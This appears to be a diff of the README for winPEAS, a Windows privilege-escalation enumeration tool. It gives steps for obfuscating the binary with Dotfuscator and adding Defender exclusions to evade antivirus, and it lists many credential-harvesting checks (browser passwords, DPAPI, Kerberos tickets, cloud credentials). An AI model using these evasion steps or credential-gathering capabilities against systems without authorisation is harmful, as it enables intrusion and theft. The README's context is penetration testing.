+In order to compile an **ofuscated version** of Winpeas and bypass some AVs you need to ** install dotfuscator ** in *VisualStudio*.
+
+To install it *open VisualStudio --> Go to Search (CTRL+Q) --> Write "dotfuscator"* and just follow the instructions to install it.
+
+To use **dotfuscator** you will need to **create an account** *(they will send you an email to the address you set during registration*).
+
+Once you have installed and activated it you need to:
+1. **Compile** winpeas in VisualStudio
+2. **Open dotfuscator** app
+3. **Open** in dotfuscator **winPEAS.exe compiled**
+4. Click on **Build**
+5. The **single, minimized and obfuscated binary** will appear in a **folder called Dotfuscator inside the folder were winPEAS.exe** and the DLL were (this location will be saved by dotfuscator and by default all the following builds will appear in this folder).
+
+**I'm sorry that all of this is necessary but is worth it. Dotfuscator minimizes a bit the size of the executable and obfuscates the code**.
+
+![](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/images/dotfuscator.PNG)
+
+**IMPORTANT**: Note that Defender will higly probable delete the winpeas iintial unobfuscated version, so you need to set as expections the origin folder of Winpeas and the folder were the obfuscated version will be saved:
+![](https://user-images.githubusercontent.com/1741662/148418852-e7ffee6a-c270-4e26-bf38-bb8977b3ad9c.png)
+</details>
+
+## Checks
+
+<details>
+  <summary>Details</summary>
+
+- **System Information**
+  - [x] Basic System info information
+  - [x] Use Watson to search for vulnerabilities
+  - [x] Enumerate Microsoft updates
+  - [x] PS, Audit, WEF and LAPS Settings
+  - [x] LSA protection
+  - [x] Credential Guard
+  - [x] WDigest
+  - [x] Number of cached cred
+  - [x] Environment Variables
+  - [x] Internet Settings
+  - [x] Current drives information
+  - [x] AV
+  - [x] Windows Defender
+  - [x] UAC configuration
+  - [x] NTLM Settings
+  - [x] Local Group Policy
+  - [x] Applocker Configuration & bypass suggestions
+  - [x] Printers
+  - [x] Named Pipes
+  - [x] AMSI Providers
+  - [x] SysMon
+  - [x] .NET Versions
+
+- **Users Information**
+  - [x] Users information
+  - [x] Current token privileges
+  - [x] Clipboard text
+  - [x] Current logged users
+  - [x] RDP sessions
+  - [x] Ever logged users
+  - [x] Autologin credentials
+  - [x] Home folders
+  - [x] Password policies
+  - [x] Local User details
+  - [x] Logon Sessions
+
+- **Processes Information**
+  - [x] Interesting processes (non Microsoft)
+
+- **Services Information**
+  - [x] Interesting services (non Microsoft) information
+  - [x] Modifiable services
+  - [x] Writable service registry binpath
+  - [x] PATH Dll Hijacking
+
+- **Applications Information**
+  - [x] Current Active Window
+  - [x] Installed software
+  - [x] AutoRuns
+  - [x] Scheduled tasks
+  - [x] Device drivers
+
+- **Network Information**
+  - [x] Current net shares
+  - [x] Mapped drives (WMI)
+  - [x] hosts file
+  - [x] Network Interfaces
+  - [x] Listening ports
+  - [x] Firewall rules
+  - [x] DNS Cache (limit 70)
+  - [x] Internet Settings
+
+- **Windows Credentials**
+  - [x] Windows Vault
+  - [x] Credential Manager
+  - [x] Saved RDP settings
+  - [x] Recently run commands
+  - [x] Default PS transcripts files
+  - [x] DPAPI Masterkeys
+  - [x] DPAPI Credential files
+  - [x] Remote Desktop Connection Manager credentials
+  - [x] Kerberos Tickets
+  - [x] Wifi
+  - [x] AppCmd.exe
+  - [x] SSClient.exe
+  - [x] SCCM
+  - [x] Security Package Credentials
+  - [x] AlwaysInstallElevated
+  - [x] WSUS
+
+- **Browser Information**
+  - [x] Firefox DBs
+  - [x] Credentials in firefox history
+  - [x] Chrome DBs
+  - [x] Credentials in chrome history
+  - [x] Current IE tabs
+  - [x] Credentials in IE history
+  - [x] IE Favorites
+  - [x] Extracting saved passwords for: Firefox, Chrome, Opera, Brave
+
+- **Interesting Files and registry**
+  - [x] Putty sessions
+  - [x] Putty SSH host keys
+  - [x] SuperPutty info
+  - [x] Office365 endpoints synced by OneDrive
+  - [x] SSH Keys inside registry
+  - [x] Cloud credentials
+  - [x] Check for unattended files
+  - [x] Check for SAM & SYSTEM backups
+  - [x] Check for cached GPP Passwords
+  - [x] Check for and extract creds from McAffe SiteList.xml files
+  - [x] Possible registries with credentials
+  - [x] Possible credentials files in users homes
+  - [x] Possible password files inside the Recycle bin
+  - [x] Possible files containing credentials (this take some minutes)
+  - [x] User documents (limit 100)
+  - [x] Oracle SQL Developer config files check
+  - [x] Slack files search
+  - [x] Outlook downloads
+  - [x] Machine and user certificate files
+  - [x] Office most recent documents
+  - [x] Hidden files and folders
+  - [x] Executable files in non-default folders with write permissions
+  - [x] WSL check
+
+- **Events Information**
+  - [x] Logon + Explicit Logon Events
+  - [x] Process Creation Events
+  - [x] PowerShell Events
+  - [x] Power On/Off Events
+
+- **Additional (slower) checks**
+  - [x] LOLBAS search
+  - [x] run **[linpeas.sh](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)** in default WSL distribution
+
+</details>
+
+## TODO
+- Add more checks
+- Mantain updated Watson (last JAN 2021)
+
+If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)** or you can submit a pull request.
+
+If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.
+
+**WinPEAS** is being **updated** every time I find something that could be useful to escalate privileges.
 
 ## Please, if this tool has been useful for you consider to donate
 
 [![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
 
-## PEASS Style
-
-Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
-
 ## Advisory
 
 All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
 
-By Polop<sup>(TM)</sup>
+
+By Polop<sup>(TM)</sup>, makikvues (makikvues2[at]gmail[dot].com)
